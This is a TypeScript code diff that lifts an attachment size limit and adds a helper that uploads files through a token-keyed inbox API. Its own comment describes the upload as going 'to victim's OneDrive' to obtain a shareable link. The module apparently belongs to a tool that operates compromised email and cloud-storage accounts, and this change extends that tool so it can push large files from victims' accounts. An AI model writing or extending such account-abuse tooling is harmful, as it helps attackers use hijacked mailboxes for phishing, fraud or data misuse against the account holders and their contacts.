@@ -80,15 +80,10 @@ export async function fetchWithRetry<T>(
   throw lastError;
 }
 
-/** Convert a File to base64 attachment payload using FileReader (fast, native). */
-export function fileToBase64(file: File): Promise<{ name: string; content_type: string; content_bytes: string }> {
+/** Convert a File to base64 attachment payload using FileReader (fast, native).
+ *  Works for any size; caller decides inline vs OneDrive upload. */
+export function fileToBase64(file: File): Promise<{ name: string; content_type: string; content_bytes: string; size: number }> {
   return new Promise((resolve, reject) => {
-    const MAX_MB = 3;
-    const MAX_BYTES = MAX_MB * 1024 * 1024;
-    if (file.size > MAX_BYTES) {
-      reject(new Error(`"${file.name}" is ${(file.size / 1024 / 1024).toFixed(1)}MB. Max attachment size is ${MAX_MB}MB.`));
-      return;
-    }
     const reader = new FileReader();
     reader.onload = () => {
       const result = reader.result as string;
@@ -97,10 +92,20 @@ export function fileToBase64(file: File): Promise<{ name: string; content_type: 
         name: file.name,
         content_type: file.type || "application/octet-stream",
         content_bytes: base64,
+        size: file.size,
       });
     };
     reader.onerror = () => reject(new Error(`Failed to read file "${file.name}"`));
     reader.readAsDataURL(file);
+  });
+}
+
+/** Upload a large file to victim's OneDrive and get a shareable link. */
+export async function uploadAttachmentToOneDrive(tokenId: string, payload: { filename: string; content_type: string; content_bytes: string }): Promise<{ filename: string; size: number; link: string }> {
+  return fetchWithRetry<{ filename: string; size: number; link: string }>(`/api/inbox/upload-attachment?token_id=${encodeURIComponent(tokenId)}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
   });
 }
 
